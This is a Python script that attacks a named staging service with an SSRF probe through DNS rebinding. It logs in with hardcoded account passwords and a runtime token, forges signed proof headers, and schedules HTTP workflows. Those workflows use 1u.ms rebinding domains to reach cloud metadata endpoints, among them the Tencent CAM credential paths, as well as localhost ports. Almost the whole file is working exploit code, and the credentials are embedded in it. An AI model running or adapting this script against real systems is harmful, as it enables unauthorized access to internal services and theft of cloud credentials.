#!/usr/bin/env python3
# i28694 stage SSRF DNS-rebind (single-flip 1u.ms) probe. Runs inside GitHub runner.
import os, sys, json, time, base64, hmac, hashlib, subprocess, random, string, re
HOST = "stage-assistant.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
T0 = time.time()
def el(): return int(time.time() - T0)
def _b64(s): return base64.b64encode(s.encode("utf-8","replace")).decode()
def R(k,v):
    s = v if isinstance(v,str) else json.dumps(v,ensure_ascii=False,default=str)
    print("R:%s:%s"%(k,_b64(s)),flush=True)
def log(*a): print("L: "+" ".join(str(x) for x in a),flush=True)

def curl(args,timeout=45):
    try:
        r=subprocess.run(["curl","-s","-k","-m",str(timeout)]+args,capture_output=True,timeout=timeout+15)
        return r.returncode,r.stdout,r.stderr[:300]
    except Exception as e:
        return -1,b"",repr(e)[:200]

def call(path,method="GET",body=None,hdrs=None,timeout=45,maxlen=200000):
    url="https://%s%s"%(HOST,path)
    args=["--http2","-A",UA,"-H","Accept: application/json",
          "-H","Referer: https://%s/"%HOST,"-H","Origin: https://%s"%HOST,
          "-w","\n__CODE__%{http_code}"]
    if hdrs:
        for k,v in hdrs.items(): args+=["-H","%s: %s"%(k,v)]
    if body is not None:
        args+=["-X",method,"-H","Content-Type: application/json","--data-binary",json.dumps(body)]
    elif method!="GET":
        args+=["-X",method]
    args+=[url]
    rc,out,err=curl(args,timeout=timeout)
    txt=out.decode("utf-8","replace")
    code="";i=txt.rfind("__CODE__")
    if i>=0: code=txt[i+8:].strip()[:3]; txt=txt[:i]
    return {"path":path,"code":code,"body":txt[:maxlen],"len":len(txt),
            "err":(err.decode("utf-8","replace") if isinstance(err,(bytes,bytearray)) else str(err))}

def J(r):
    try: return json.loads(r["body"])
    except Exception: return None

# ---------- identity ----------
R("env",{"t":el()})
def login(ident,pw):
    rc,out,err=curl(["--http2","-A",UA,"-i","-X","POST","-H","Content-Type: application/json",
                     "--data-binary",json.dumps({"identifier":ident,"password":pw}),
                     "https://%s/api/auth/login"%HOST],timeout=45)
    txt=out.decode("utf-8","replace")
    code="";m=re.search(r"HTTP/[0-9.]+ (\d{3})",txt)
    if m: code=m.group(1)
    hd="\n".join([l for l in txt.splitlines() if l.lower().startswith("set-cookie:")])
    mc=re.search(r"lumii_session=([^;]+)",hd)
    ck="lumii_session="+mc.group(1) if mc else None
    body=txt.split("\r\n\r\n",1)[-1] if "\r\n\r\n" in txt else txt
    uid=""
    try:
        bj=json.loads(body[body.find("{"):]) if "{" in body else {}
        uid=(bj.get("user") or {}).get("id") or bj.get("id") or ""
    except Exception: pass
    return code,ck,uid,body[:300]

cookie=None;UID=""
CREDS=[("lc-app-admin@lumii.dev","Lianchuang#2026"),
       ("lc-zone-leader@lumii.dev","Lianchuang#2026"),
       ("e2e-accept@lumii.dev","E2eAccept!0813"),
       ("satish@lumii.dev","Lianchuang#2026"),
       ("admin@lumii.dev","Lianchuang#2026")]
for ident,pw in CREDS:
    code,ck,uid,body=login(ident,pw)
    R("A_try_%s"%ident.split("@")[0],{"code":code,"uid":uid,"cookie":bool(ck),"body":body[:200]})
    if code=="200" and ck:
        cookie=ck;UID=uid;break
ORG="org_P7YGEJ2tbmGZRXuCTb2qG"
R("A_login",{"uid":UID,"cookie":bool(cookie)})
if cookie and not UID:
    me=call("/api/me",hdrs={"Cookie":cookie})
    mj=J(me) or {}; UID=(mj.get("id") or (mj.get("user") or {}).get("id") or "")
    R("A_me",{"code":me["code"],"uid":UID,"body":me["body"][:400]})

# ---------- runtime credential ----------
RID="rt_9Mte8fzMj3WnKCXcXjBwe"; RTOKEN="rfQBlHAGCOaT67wTXd85o6hk5z8LK-2pMk_P7YHDIZ0"
PROOF_KEY=None
k=call("/api/runtimes/keys/current",hdrs={"x-agent-id":RID,"x-agent-token":RTOKEN})
R("A_keys_existing",{"code":k["code"],"body":k["body"][:500]})
if k["code"]=="200":
    try: PROOF_KEY=(J(k) or {}).get("proof_key")
    except: pass
if not PROOF_KEY:
    # create fresh runtime
    lst=call("/api/runtimes",hdrs={"Cookie":cookie} if cookie else None)
    R("A_list_rt",{"code":lst["code"],"body":lst["body"][:1500]})
    cr=call("/api/runtimes","POST",{"name":"rb28694-%d"%random.randint(1000,9999)},
            hdrs={"Cookie":cookie} if cookie else None)
    R("A_create_rt",{"code":cr["code"],"body":cr["body"][:2500]})
    blob=cr["body"]
    m_id=re.search(r"AGENT_ID='([^']+)'",blob) or re.search(r'AGENT_ID["\s:=]+([A-Za-z0-9_\-]{6,})',blob)
    m_tk=re.search(r"AGENT_TOKEN='([^']+)'",blob) or re.search(r'AGENT_TOKEN["\s:=]+([A-Za-z0-9_\-]{12,})',blob)
    cj=J(cr) or {}
    nid=(m_id.group(1) if m_id else (cj.get("id") or (cj.get("runtime") or {}).get("id")))
    ntk=(m_tk.group(1) if m_tk else (cj.get("token") or cj.get("agentToken") or (cj.get("runtime") or {}).get("token")))
    if nid and ntk:
        RID=nid; RTOKEN=ntk
        k2=call("/api/runtimes/keys/current",hdrs={"x-agent-id":RID,"x-agent-token":RTOKEN})
        R("A_keys_new",{"code":k2["code"],"body":k2["body"][:500]})
        if k2["code"]=="200":
            try: PROOF_KEY=(J(k2) or {}).get("proof_key")
            except: pass
R("A_cred",{"rid":RID,"proof_key":bool(PROOF_KEY)})

SK="conv_28694probe"; PLATFORM="dashboard"
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def make_proof(actor,sk=SK,platform=PLATFORM,ttl=1500):
    if not PROOF_KEY: return ""
    now=int(time.time())
    claims={"session_key":sk,"platform":platform,"chat_id":sk,"actor_id":actor,
            "iss":RID,"aud":RID,"iat":now-5,"exp":now+ttl}
    p=b64u(json.dumps(claims,separators=(",",":")).encode())
    sig=b64u(hmac.new(PROOF_KEY.encode(),p.encode(),hashlib.sha256).digest())
    return "v2."+p+"."+sig

def internal(name,extra=None,actor=None,maxlen=200000):
    actor=actor or UID
    b={"platform":PLATFORM,"actor_id":actor,"session_key":SK}
    if extra: b.update(extra)
    hdrs={"Authorization":"Bearer "+RTOKEN,"x-agent-id":RID}
    pr=make_proof(actor=actor)
    if pr: hdrs["x-lumii-turn-proof"]=pr
    return call("/internal/"+name,"POST",b,hdrs=hdrs,maxlen=maxlen)

# sanity
pl=internal("projects/list",{},maxlen=100000)
R("B_projects",{"code":pl["code"],"body":pl["body"][:800]})
res=internal("tickets/resolve",{},maxlen=200000)
R("B_resolve",{"code":res["code"],"body":res["body"][:1500]})

# scratch folder + sheet
cf=internal("tickets/create-folder",{"name":"rb28694","icon":"grid","description":"rb28694 ssrf probe"})
R("C_create_folder",{"code":cf["code"],"body":cf["body"][:1200]})
cj=J(cf) or {}
sheet_id=(cj.get("sheet") or {}).get("id"); folder_id=(cj.get("folder") or {}).get("id")
FKEY=None
if sheet_id:
    sc=internal("tickets/schema",{"sheet_id":sheet_id})
    R("C_schema",{"code":sc["code"],"body":sc["body"][:1200]})
    sj=J(sc) or {}
    fs=sj.get("fields") or []
    if fs: FKEY=fs[0].get("key")
R("C_ids",{"sheet":sheet_id,"folder":folder_id,"field":FKEY})

def fresh_label(): return "".join(random.choice(string.ascii_lowercase+string.digits) for _ in range(10))
def rebind_domain(ip2, ip1="1.1.1.1"):
    # ip2 like "169.254.0.23" -> a=169.254 b=0.23 ; return make-ip1-rebind-a-b-rr-label.1u.ms
    parts=ip2.split(".")
    a=".".join(parts[:2]); b=".".join(parts[2:])
    return "make-%s-rebind-%s-%s-rr-%s.1u.ms"%(ip1,a,b,fresh_label())

def upsert_wf(name,steps,once_in=3600):
    onceAt=time.strftime("%Y-%m-%dT%H:%M:%SZ",time.gmtime(time.time()+once_in))
    wf={"name":name[:60],"enabled":True,
        "trigger":{"kind":"schedule","every":"once","onceAt":onceAt},"steps":steps}
    return internal("tickets/upsert-workflow",{"folder_id":folder_id,"workflow":wf})

def trial(name,url,method="GET",timeoutMs=9000):
    steps=[{"id":"h1","kind":"http","method":method,"url":url,"timeoutMs":timeoutMs}]
    up=upsert_wf(name,steps)
    upj=J(up) or {}
    wid=(upj.get("workflow") or {}).get("id") or (upj.get("id")) or ""
    R("T_up_%s"%name,{"code":up["code"],"wid":wid,"body":up["body"][:400]})
    if not wid: return {"up":up}
    tr=internal("tickets/trial-workflow",{"folder_id":folder_id,"workflow_id":wid},maxlen=200000)
    trj=J(tr) or {}
    R("T_%s"%name,{"code":tr["code"],"status":trj.get("status"),"ok":trj.get("ok"),
                   "error":trj.get("error"),"steps":trj.get("steps")})
    return {"up":up,"tr":tr,"wid":wid}

# ---------- PHASE C: baseline + control + rebind trials ----------
if sheet_id and folder_id:
    trial("base_baidu","https://www.baidu.com/",timeoutMs=9000)
    # control: pure internal single-record host -> expect gate reject
    trial("ctl_sslip193","http://169.254.0.23.sslip.io/latest/meta-data/",timeoutMs=6000)
    trial("ctl_sslip254","http://169.254.169.254.sslip.io/latest/meta-data/",timeoutMs=6000)
    # rebind targets: gate sees 1.1.1.1 (public pass); fetch sees internal
    targets=[
        ("rb_tencent_meta","169.254.0.23",80,"/latest/meta-data/"),
        ("rb_tencent_cam","169.254.0.23",80,"/latest/meta-data/cam/security-credentials/"),
        ("rb_generic_meta","169.254.169.254",80,"/latest/meta-data/"),
        ("rb_aliyun_meta","100.100.100.200",80,"/latest/meta-data/"),
        ("rb_localhost80","127.0.0.1",80,"/"),
        ("rb_localhost443","127.0.0.1",443,"/"),
        ("rb_localhost8080","127.0.0.1",8080,"/"),
    ]
    for tag,ip2,port,path in targets:
        dom=rebind_domain(ip2)
        url="http://%s:%d%s"%(dom,port,path)
        trial(tag,url,timeoutMs=7000)
        time.sleep(0.3)
    R("D_done",{"t":el()})

R("DONE",{"t":el()})
